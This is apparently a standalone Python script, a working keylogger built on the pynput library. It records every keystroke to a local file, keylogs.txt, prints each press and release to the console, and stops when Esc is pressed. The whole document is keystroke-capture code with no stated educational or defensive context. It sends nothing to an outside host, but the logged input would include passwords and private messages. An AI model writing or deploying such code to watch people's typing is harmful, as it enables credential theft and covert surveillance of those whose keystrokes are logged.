import time
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        key = key.char
    except AttributeError:
        key = str(key)
    print(f'Key pressed: {key}')
    with open('keylogs.txt', 'a') as file:
        file.write(key + '\n')
        file.flush()
def on_release(key):
    if key == Key.esc:
        return False
    else:
        print(f'Key released: {key}')

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
